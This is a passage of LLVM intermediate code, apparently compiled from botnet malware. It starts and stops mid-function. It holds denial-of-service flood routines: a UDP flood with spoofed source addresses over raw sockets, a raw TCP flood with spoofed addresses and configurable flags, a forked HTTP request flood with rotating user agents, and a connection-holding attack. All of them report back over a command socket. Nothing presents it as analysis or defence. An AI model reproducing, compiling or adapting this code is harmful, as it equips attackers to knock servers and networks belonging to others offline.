  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #18
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %64

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i64 @time(i64* null) #3
  %41 = zext i32 %2 to i64
  %42 = add i64 %40, %41
  %43 = sext i32 %4 to i64
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %sext72 = shl i64 %42, 32
  %45 = ashr exact i64 %sext72, 32
  %46 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %39
  %.069.ph = phi i32 [ 0, %39 ], [ %.069.ph.be, %.outer.backedge ]
  %.0.ph = phi i32 [ 0, %39 ], [ %58, %.outer.backedge ]
  br label %47

; <label>:47:                                     ; preds = %.outer, %54
  %.0 = phi i32 [ 0, %54 ], [ %.0.ph, %.outer ]
  %48 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %43, i32 0, %struct.sockaddr* nonnull %44, i32 16) #3
  %49 = icmp eq i32 %.0, %5
  br i1 %49, label %50, label %57

; <label>:50:                                     ; preds = %47
  br i1 %12, label %51, label %54

; <label>:51:                                     ; preds = %50
  %52 = call i32 @rand_cmwc()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %20, align 2
  br label %54

; <label>:54:                                     ; preds = %51, %50
  %55 = call i64 @time(i64* null) #3
  %56 = icmp sgt i64 %55, %45
  br i1 %56, label %.loopexit.loopexit, label %47

; <label>:57:                                     ; preds = %47
  %58 = add i32 %.0, 1
  %59 = icmp eq i32 %.069.ph, %6
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %57
  %61 = call i32 @usleep(i32 %46) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %60, %62
  %.069.ph.be = phi i32 [ %63, %62 ], [ 0, %60 ]
  br label %.outer

; <label>:62:                                     ; preds = %57
  %63 = add i32 %.069.ph, 1
  br label %.outer.backedge

; <label>:64:                                     ; preds = %24
  %65 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %70

; <label>:67:                                     ; preds = %64
  %68 = load i32, i32* @mainCommSock, align 4
  %69 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %.loopexit

; <label>:70:                                     ; preds = %64
  store i32 1, i32* %10, align 4
  %71 = bitcast i32* %10 to i8*
  %72 = call i32 @setsockopt(i32 %65, i32 0, i32 3, i8* nonnull %71, i32 4) #3
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %.preheader.preheader

.preheader.preheader:                             ; preds = %70
  br label %.preheader

; <label>:74:                                     ; preds = %70
  %75 = load i32, i32* @mainCommSock, align 4
  %76 = call i32 (i32, i8*, ...) @sockprintf(i32 %75, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.07076 = phi i32 [ %77, %.preheader ], [ 50, %.preheader.preheader ]
  %77 = add nsw i32 %.07076, -1
  %78 = call i64 @time(i64* null) #3
  %79 = call i32 @rand_cmwc()
  %80 = zext i32 %79 to i64
  %81 = xor i64 %80, %78
  %82 = trunc i64 %81 to i32
  call void @srand(i32 %82) #3
  %83 = call i32 @rand() #3
  call void @init_rand(i32 %83)
  %84 = icmp eq i32 %77, 0
  br i1 %84, label %85, label %.preheader

; <label>:85:                                     ; preds = %.preheader
  %86 = sext i32 %4 to i64
  %87 = add nsw i64 %86, 28
  %88 = call i8* @llvm.stacksave()
  %89 = alloca i8, i64 %87, align 16
  %90 = bitcast i8* %89 to %struct.iphdr*
  %91 = getelementptr i8, i8* %89, i64 20
  %92 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @getDatIP() #3
  %95 = call i32 @htonl(i32 %94) #18
  %96 = add nsw i64 %86, 8
  %97 = trunc i64 %96 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %90, i32 %93, i32 %95, i8 zeroext 17, i32 %97)
  %98 = trunc i64 %96 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #18
  %100 = getelementptr inbounds i8, i8* %89, i64 24
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 8
  %102 = call i32 @rand_cmwc()
  %103 = trunc i32 %102 to i16
  %104 = bitcast i8* %91 to i16*
  store i16 %103, i16* %104, align 4
  br i1 %12, label %105, label %107

; <label>:105:                                    ; preds = %85
  %106 = call i32 @rand_cmwc()
  br label %111

; <label>:107:                                    ; preds = %85
  %108 = trunc i32 %1 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #18
  %110 = zext i16 %109 to i32
  br label %111

; <label>:111:                                    ; preds = %107, %105
  %112 = phi i32 [ %106, %105 ], [ %110, %107 ]
  %113 = trunc i32 %112 to i16
  %114 = getelementptr inbounds i8, i8* %89, i64 22
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds i8, i8* %89, i64 26
  %117 = bitcast i8* %116 to i16*
  store i16 0, i16* %117, align 2
  %118 = getelementptr inbounds i8, i8* %89, i64 28
  call void @makeRandomStr(i8* %118, i32 %4)
  %119 = bitcast i8* %89 to i16*
  %120 = getelementptr inbounds i8, i8* %89, i64 2
  %121 = bitcast i8* %120 to i16*
  %122 = load i16, i16* %121, align 2
  %123 = zext i16 %122 to i32
  %124 = call zeroext i16 @csum(i16* nonnull %119, i32 %123)
  %125 = getelementptr inbounds i8, i8* %89, i64 10
  %126 = bitcast i8* %125 to i16*
  store i16 %124, i16* %126, align 2
  %127 = call i64 @time(i64* null) #3
  %128 = zext i32 %2 to i64
  %129 = add i64 %127, %128
  %130 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %131 = getelementptr inbounds i8, i8* %89, i64 4
  %132 = bitcast i8* %131 to i16*
  %133 = getelementptr inbounds i8, i8* %89, i64 12
  %134 = bitcast i8* %133 to i32*
  %sext = shl i64 %129, 32
  %135 = ashr exact i64 %sext, 32
  %136 = trunc i32 %1 to i16
  %137 = mul nsw i32 %7, 1000
  br label %.outer73

.outer73:                                         ; preds = %.outer73.backedge, %111
  %.068.ph = phi i32 [ 0, %111 ], [ %162, %.outer73.backedge ]
  %.067.ph = phi i32 [ 0, %111 ], [ %.067.ph.be, %.outer73.backedge ]
  br label %138

; <label>:138:                                    ; preds = %.outer73, %158
  %.068 = phi i32 [ 0, %158 ], [ %.068.ph, %.outer73 ]
  %139 = call i64 @sendto(i32 %65, i8* nonnull %89, i64 %87, i32 0, %struct.sockaddr* nonnull %130, i32 16) #3
  %140 = call i32 @rand_cmwc()
  %141 = trunc i32 %140 to i16
  store i16 %141, i16* %104, align 4
  br i1 %12, label %142, label %144

; <label>:142:                                    ; preds = %138
  %143 = call i32 @rand_cmwc()
  br label %147

; <label>:144:                                    ; preds = %138
  %145 = call zeroext i16 @htons(i16 zeroext %136) #18
  %146 = zext i16 %145 to i32
  br label %147

; <label>:147:                                    ; preds = %144, %142
  %148 = phi i32 [ %143, %142 ], [ %146, %144 ]
  %149 = trunc i32 %148 to i16
  store i16 %149, i16* %115, align 2
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %132, align 4
  %152 = call i32 @getDatIP() #3
  %153 = call i32 @htonl(i32 %152) #18
  store i32 %153, i32* %134, align 4
  %154 = load i16, i16* %121, align 2
  %155 = zext i16 %154 to i32
  %156 = call zeroext i16 @csum(i16* nonnull %119, i32 %155)
  store i16 %156, i16* %126, align 2
  %157 = icmp eq i32 %.068, %5
  br i1 %157, label %158, label %161

; <label>:158:                                    ; preds = %147
  %159 = call i64 @time(i64* null) #3
  %160 = icmp sgt i64 %159, %135
  br i1 %160, label %168, label %138

; <label>:161:                                    ; preds = %147
  %162 = add i32 %.068, 1
  %163 = icmp eq i32 %.067.ph, %6
  br i1 %163, label %164, label %166

; <label>:164:                                    ; preds = %161
  %165 = call i32 @usleep(i32 %137) #3
  br label %.outer73.backedge

.outer73.backedge:                                ; preds = %164, %166
  %.067.ph.be = phi i32 [ 0, %164 ], [ %167, %166 ]
  br label %.outer73

; <label>:166:                                    ; preds = %161
  %167 = add i32 %.067.ph, 1
  br label %.outer73.backedge

; <label>:168:                                    ; preds = %158
  call void @llvm.stackrestore(i8* %88)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %54
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %34, %168, %74, %67, %31
  ret void
}

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %162

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %162

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i64 0, i64 0))
  br label %162

; <label>:38:                                     ; preds = %31
  %39 = sext i32 %5 to i64
  %40 = add nsw i64 %39, 40
  %41 = call i8* @llvm.stacksave()
  %42 = alloca i8, i64 %40, align 16
  %43 = bitcast i8* %42 to %struct.iphdr*
  %44 = getelementptr i8, i8* %42, i64 20
  %45 = bitcast i8* %44 to %struct.tcphdr*
  %46 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @getDatIP() #3
  %49 = call i32 @htonl(i32 %48) #18
  %50 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %43, i32 %47, i32 %49, i8 zeroext 6, i32 %50)
  %51 = call i32 @rand_cmwc()
  %52 = trunc i32 %51 to i16
  %53 = bitcast i8* %44 to i16*
  store i16 %52, i16* %53, align 4
  %54 = call i32 @rand_cmwc()
  %55 = getelementptr inbounds i8, i8* %42, i64 24
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 8
  %57 = getelementptr inbounds i8, i8* %42, i64 28
  %58 = bitcast i8* %57 to i32*
  store i32 0, i32* %58, align 4
  %59 = getelementptr inbounds i8, i8* %42, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = load i16, i16* %60, align 16
  %62 = and i16 %61, -241
  %63 = or i16 %62, 80
  store i16 %63, i16* %60, align 16
  %64 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i64 0, i64 0)) #15
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %68, label %.preheader

.preheader:                                       ; preds = %38
  %66 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %67 = icmp eq i8* %66, null
  br i1 %67, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:68:                                     ; preds = %38
  %69 = and i16 %61, -8177
  %70 = or i16 %69, 8016
  store i16 %70, i16* %60, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %71 = phi i8* [ %83, %.backedge68 ], [ %66, %.lr.ph.preheader ]
  %72 = call i32 @strcmp(i8* nonnull %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i64 0, i64 0)) #15
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i16, i16* %60, align 16
  %76 = or i16 %75, 512
  store i16 %76, i16* %60, align 16
  br label %.backedge68

; <label>:77:                                     ; preds = %.lr.ph
  %78 = call i32 @strcmp(i8* nonnull %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i64 0, i64 0)) #15
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %85

; <label>:80:                                     ; preds = %77
  %81 = load i16, i16* %60, align 16
  %82 = or i16 %81, 1024
  store i16 %82, i16* %60, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %80, %94, %103, %100, %88, %74
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

; <label>:85:                                     ; preds = %77
  %86 = call i32 @strcmp(i8* nonnull %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i64 0, i64 0)) #15
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %91

; <label>:88:                                     ; preds = %85
  %89 = load i16, i16* %60, align 16
  %90 = or i16 %89, 256
  store i16 %90, i16* %60, align 16
  br label %.backedge68

; <label>:91:                                     ; preds = %85
  %92 = call i32 @strcmp(i8* nonnull %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i64 0, i64 0)) #15
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %94, label %97

; <label>:94:                                     ; preds = %91
  %95 = load i16, i16* %60, align 16
  %96 = or i16 %95, 4096
  store i16 %96, i16* %60, align 16
  br label %.backedge68

; <label>:97:                                     ; preds = %91
  %98 = call i32 @strcmp(i8* nonnull %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i64 0, i64 0)) #15
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %97
  %101 = load i16, i16* %60, align 16
  %102 = or i16 %101, 2048
  store i16 %102, i16* %60, align 16
  br label %.backedge68

; <label>:103:                                    ; preds = %97
  %104 = load i32, i32* @mainCommSock, align 4
  %105 = call i32 (i32, i8*, ...) @sockprintf(i32 %104, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i64 0, i64 0), i8* nonnull %71)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %68
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds i8, i8* %42, i64 34
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %110 = getelementptr inbounds i8, i8* %42, i64 36
  %111 = bitcast i8* %110 to i16*
  store i16 0, i16* %111, align 4
  %112 = getelementptr inbounds i8, i8* %42, i64 38
  %113 = bitcast i8* %112 to i16*
  store i16 0, i16* %113, align 2
  br i1 %11, label %114, label %116

; <label>:114:                                    ; preds = %.loopexit
  %115 = call i32 @rand_cmwc()
  br label %120

; <label>:116:                                    ; preds = %.loopexit
  %117 = trunc i32 %1 to i16
  %118 = call zeroext i16 @htons(i16 zeroext %117) #18
  %119 = zext i16 %118 to i32
  br label %120

; <label>:120:                                    ; preds = %116, %114
  %121 = phi i32 [ %115, %114 ], [ %119, %116 ]
  %122 = trunc i32 %121 to i16
  %123 = getelementptr inbounds i8, i8* %42, i64 22
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %125 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %43, %struct.tcphdr* nonnull %45)
  store i16 %125, i16* %111, align 4
  %126 = bitcast i8* %42 to i16*
  %127 = getelementptr inbounds i8, i8* %42, i64 2
  %128 = bitcast i8* %127 to i16*
  %129 = load i16, i16* %128, align 2
  %130 = zext i16 %129 to i32
  %131 = call zeroext i16 @csum(i16* nonnull %126, i32 %130)
  %132 = getelementptr inbounds i8, i8* %42, i64 10
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call i64 @time(i64* null) #3
  %135 = zext i32 %2 to i64
  %136 = add i64 %134, %135
  %137 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %138 = getelementptr inbounds i8, i8* %42, i64 12
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr inbounds i8, i8* %42, i64 4
  %141 = bitcast i8* %140 to i16*
  %sext = shl i64 %136, 32
  %142 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %120
  %.065 = phi i32 [ 0, %120 ], [ %.065.be, %.backedge.backedge ]
  %143 = call i64 @sendto(i32 %26, i8* nonnull %42, i64 %40, i32 0, %struct.sockaddr* nonnull %137, i32 16) #3
  %144 = call i32 @getDatIP() #3
  %145 = call i32 @htonl(i32 %144) #18
  store i32 %145, i32* %139, align 4
  %146 = call i32 @rand_cmwc()
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* %141, align 4
  %148 = call i32 @rand_cmwc()
  store i32 %148, i32* %56, align 8
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %53, align 4
  store i16 0, i16* %111, align 4
  %151 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %43, %struct.tcphdr* nonnull %45)
  store i16 %151, i16* %111, align 4
  %152 = load i16, i16* %128, align 2
  %153 = zext i16 %152 to i32
  %154 = call zeroext i16 @csum(i16* nonnull %126, i32 %153)
  store i16 %154, i16* %133, align 2
  %155 = icmp eq i32 %.065, %6
  br i1 %155, label %156, label %159

; <label>:156:                                    ; preds = %.backedge
  %157 = call i64 @time(i64* null) #3
  %158 = icmp sgt i64 %157, %142
  br i1 %158, label %161, label %.backedge.backedge

; <label>:159:                                    ; preds = %.backedge
  %160 = add i32 %.065, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %159, %156
  %.065.be = phi i32 [ %160, %159 ], [ 0, %156 ]
  br label %.backedge

; <label>:161:                                    ; preds = %156
  call void @llvm.stackrestore(i8* %41)
  br label %162

; <label>:162:                                    ; preds = %18, %161, %35, %28
  ret void
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = tail call i64 @time(i64* null) #3
  %9 = zext i32 %4 to i64
  %10 = add i64 %8, %9
  %11 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %12 = tail call i32 @rand() #3
  %13 = srem i32 %12, 3
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %14
  %16 = load i8*, i8** %15, align 8
  %17 = tail call i32 @rand() #3
  %18 = sext i32 %17 to i64
  %19 = urem i64 %18, 36
  %20 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %11, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i64 0, i64 0), i8* %0, i8* %3, i8* %16, i8* %21) #3
  %23 = icmp sgt i32 %5, 0
  br i1 %23, label %.lr.ph13.preheader, label %._crit_edge14

.lr.ph13.preheader:                               ; preds = %6
  br label %.lr.ph13

; <label>:24:                                     ; preds = %.lr.ph13
  %25 = icmp slt i32 %28, %5
  br i1 %25, label %.lr.ph13, label %._crit_edge14.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %24
  %.011 = phi i32 [ %28, %24 ], [ 0, %.lr.ph13.preheader ]
  %26 = tail call i32 @fork() #3
  %27 = icmp eq i32 %26, 0
  %28 = add nuw nsw i32 %.011, 1
  br i1 %27, label %24, label %.preheader

.preheader:                                       ; preds = %.lr.ph13
  %sext = shl i64 %10, 32
  %29 = ashr exact i64 %sext, 32
  %30 = tail call i64 @time(i64* null) #3
  %31 = icmp sgt i64 %29, %30
  br i1 %31, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %32 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %.backedge, label %34

; <label>:34:                                     ; preds = %.lr.ph
  %35 = call i64 @strlen(i8* nonnull %11) #15
  %36 = call i64 @write(i32 %32, i8* nonnull %11, i64 %35) #3
  %37 = tail call i32 @close(i32 %32) #3
  br label %.backedge

.backedge:                                        ; preds = %34, %.lr.ph
  %38 = tail call i64 @time(i64* null) #3
  %39 = icmp sgt i64 %29, %38
  br i1 %39, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 1) #17
  unreachable

._crit_edge14.loopexit:                           ; preds = %24
  br label %._crit_edge14

._crit_edge14:                                    ; preds = %._crit_edge14.loopexit, %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %112

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i64 @time(i64* null) #3
  %28 = zext i32 %2 to i64
  %29 = add i64 %27, %28
  %sext = shl i64 %29, 32
  %30 = ashr exact i64 %sext, 32
  %31 = call i64 @time(i64* null) #3
  %32 = icmp sgt i64 %30, %31
  br i1 %32, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %33 = icmp sgt i32 %9, 1
  %34 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %38 = bitcast i32* %8 to i8*
  %39 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %41 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %42 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %110
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %43 = call i64 @time(i64* null) #3
  %44 = icmp sgt i64 %30, %43
  br i1 %44, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %110
  %indvars.iv = phi i64 [ %indvars.iv.next, %110 ], [ 0, %.lr.ph.preheader ]
  %45 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %46 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %47 = load i8, i8* %46, align 4
  switch i8 %47, label %110 [
    i8 0, label %48
    i8 1, label %64
    i8 2, label %91
  ]

; <label>:48:                                     ; preds = %.lr.ph
  %49 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %50 = getelementptr inbounds %struct.state_t, %struct.state_t* %45, i64 0, i32 0
  store i32 %49, i32* %50, align 8
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %49, i32 3, i8* null) #3
  %52 = or i32 %51, 2048
  %53 = call i32 (i32, i32, ...) @fcntl(i32 %49, i32 4, i32 %52) #3
  %54 = call i32 @connect(i32 %49, %struct.sockaddr* nonnull %34, i32 16) #3
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %60

; <label>:56:                                     ; preds = %48
  %57 = tail call i32* @__errno_location() #18
  %58 = load i32, i32* %57, align 4
  %59 = icmp eq i32 %58, 115
  br i1 %59, label %63, label %60

; <label>:60:                                     ; preds = %56, %48
  %61 = load i32, i32* %50, align 8
  %62 = call i32 @close(i32 %61) #3
  br label %110

; <label>:63:                                     ; preds = %56
  store i8 1, i8* %46, align 4
  br label %110

; <label>:64:                                     ; preds = %.lr.ph
